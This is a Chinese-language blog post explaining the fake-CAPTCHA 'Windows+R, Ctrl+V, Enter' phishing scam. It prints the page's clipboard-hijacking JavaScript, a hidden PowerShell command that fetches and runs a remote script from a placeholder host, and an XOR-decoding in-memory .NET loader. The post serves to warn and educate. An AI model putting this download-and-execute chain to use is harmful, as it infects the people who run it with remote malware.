+++
title = "PowerShell 钓鱼攻击是如何运作的"
date = 2024-10-29T06:57:18+08:00

[taxonomies]
tags = ["CAPTCHA", "PowerShell", "Security", "Windows"]

[extra]
images = ["/og/posts/how-does-the-powershell-phishing-attack-work.png"]
en_url = "/posts/how-does-the-powershell-phishing-attack-work/"
+++

你可能听说过一种新的 [CAPTCHA] 骗局，要求你使用 Windows + R 来证明自己不是机器人。
它会弹出一个窗口，让你依次按下 `Windows + R`、`Ctrl + V`，最后按 `Enter` 完成验证。
你可能已经知道它的大致原理，不过这次我们来仔细看看它的代码。

<!-- more -->

这类骗局经常出现在 [GitHub]、[Reddit] 等网站上。
它们通常伪装成普通评论，比如：

> 也许这个方案能解决你的问题，点击这个链接：……

对方会提供一个链接，打开之后，你会发现页面要求先完成 CAPTCHA 验证。
点击验证按钮，页面就会弹出一个窗口，要求你使用一组快捷键完成验证，例如：

> 验证步骤：\
> 1 - 按下 Windows + R\
> 2 - 按下 Ctrl + V\
> 3 - 按下 Enter

如果照着这些步骤操作，你就掉进了陷阱。

### 这个过程中发生了什么？

我们直接看代码，看看整个过程中执行了哪些操作。

首先，用 [cURL] 获取目标网址的源代码。为了避免你误入陷阱，这里使用[示例域名][example domain]。

```bash
curl https://example.com/captcha.html
```

获取的内容中，关键代码如下：

```js
function open_modal() {
  var copyText =
    "powershell -WindowStyle Hidden ([ScriptBlock]::Create((irm https://example.com/scam))).Invoke()";
  var textarea = document.createElement("textarea");
  textarea.value = copyText;
  document.body.appendChild(textarea);
  textarea.select();
  document.execCommand("copy");
  document.body.removeChild(textarea);
  setTimeout(() => {
    document.querySelector("#modal").classList.remove("hidden");
  }, 2000);
}
```

它会创建一个钓鱼弹窗，同时用 [execCommand("copy")] 悄悄把一条命令复制到你的剪贴板。
浏览器不能随意自动向用户的剪贴板写入文本，需要有用户交互，所以这里安排了一个 CAPTCHA 按钮。
我们来看看复制的命令做了什么：

```powershell
powershell -WindowStyle Hidden ([ScriptBlock]::Create((irm https://example.com/scam))).Invoke()
```

- `irm` 是 [PowerShell] 中 [Invoke-RestMethod] 命令的别名，用于向 RESTful Web 服务发送 HTTP 或 HTTPS 请求。
- [\[ScriptBlock\]::Create] 根据传入的脚本内容创建一个脚本块，以便在提供执行上下文后运行。
- [-WindowStyle Hidden] 把会话的窗口样式设为隐藏。

接下来看看 `https://example.com/scam` 中的内容：

```bash
curl https://example.com/scam
```

```powershell
$url = "https://example.com/binary"
$webClient = New-Object System.Net.WebClient
$sell61 = $webClient.DownloadData($url)
$gossip123 = 0x09, 0x04, 0x05
$struggle6 = [byte[]]::new($sell61.Length)

for ($i = 0; $i -lt $sell61.Length; $i++) {
  $struggle6[$i] = $sell61[$i] -bxor $gossip123[$i % $gossip123.Length]
}

$afraid16 = [System.AppDomain]::CurrentDomain.Load($struggle6)

if ($afraid16.EntryPoint -ne $null) {
  $afraid16.EntryPoint.Invoke($null, @($null))
} else {
  Write-Host "glass glimpse glue gloom"
}
```

- [New-Object System.Net.WebClient] 提供了向 URI 指定的资源发送数据，以及从中接收数据的常用方法。
- `-bxor` 是一个进行按位异或运算的[算术运算符][arithmetic operator]。这里的循环应该是在对下载的数据进行反混淆。
- [\[Sytem.AppDomain\]::CurrentDomain.Load] 把一个[程序集][Assembly]加载到指定的应用程序域中。

之后，攻击者就可以通过植入的程序，在你的操作系统上执行各种操作。

### 为什么这种钓鱼方式很有效？

有效的钓鱼手法往往操作简单，而且能让人在毫无察觉的情况下中招。这就是 `misdirection`，也就是注意力误导。
就像 CAPTCHA 一样，层出不穷的验证方式容易让人放松警惕，再加上一些人缺乏基础计算机知识，就可能掉进陷阱。
如果想进一步了解，可以看看这段视频：<span class="wrap">[The Art of Misdirection]</span>。

另一方面，随着智能手机和平板电脑的普及，有些人反而不熟悉电脑，尤其是孩子。
正如这篇 <span class="wrap">[r/Teachers 的 Reddit 帖子][Reddit post from r/Teachers]</span>里提到的，越来越多学生不知道如何使用电脑。
他们只用笔记本完成学校作业，而学校设备上的操作系统往往受到限制或运行在沙盒环境中，能做的事情也很有限。

这些因素叠加在一起，让这种钓鱼攻击变得格外有效。

### 其他类似的攻击

网上也有一些商家，以极低的价格售卖 Steam 游戏。
他们会给你一段脚本，要求你执行。
脚本会在电脑上安装盗版游戏，同时借机植入恶意脚本。

### 相关链接

- [程序集][Assembly]
- [CAPTCHA]
- [GitHub]
- [Invoke-RestMethod]
- [New-Object System.Net.WebClient]
- [PowerShell]
- [Reddit]
- [r/Teachers 的 Reddit 帖子][Reddit post from r/Teachers]
- [The Art of Misdirection]
- [算术运算符][arithmetic operator]
- [cURL]
- [示例域名][example domain]
- [execCommand("Copy")]
- [-WindowStyle Hidden]
- [\[ScriptBlock\]::Create]
- [\[Sytem.AppDomain\]::CurrentDomain.Load]

[Assembly]: https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly
[CAPTCHA]: https://en.wikipedia.org/wiki/CAPTCHA
[GitHub]: https://github.com
[Invoke-RestMethod]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-restmethod
[New-Object System.Net.WebClient]: https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient
[PowerShell]: https://learn.microsoft.com/en-us/powershell/
[Reddit]: https://www.reddit.com
[Reddit post from r/Teachers]: https://www.reddit.com/r/Teachers/comments/xuxbo9/why_dont_they_know_how_to_use_computers/
[The Art of Misdirection]: https://www.youtube.com/watch?v=GZGY0wPAnus
[arithmetic operator]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_arithmetic_operators
[cURL]: https://curl.se
[example domain]: https://www.iana.org/help/example-domains
[execCommand("Copy")]: https://developer.mozilla.org/en-US/docs/Web/API/Document/execCommand
[-WindowStyle Hidden]: https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pwsh#-windowstyle---w
[\[ScriptBlock\]::Create]: https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.scriptblock.create
[\[Sytem.AppDomain\]::CurrentDomain.Load]: https://learn.microsoft.com/en-us/dotnet/api/system.appdomain.load
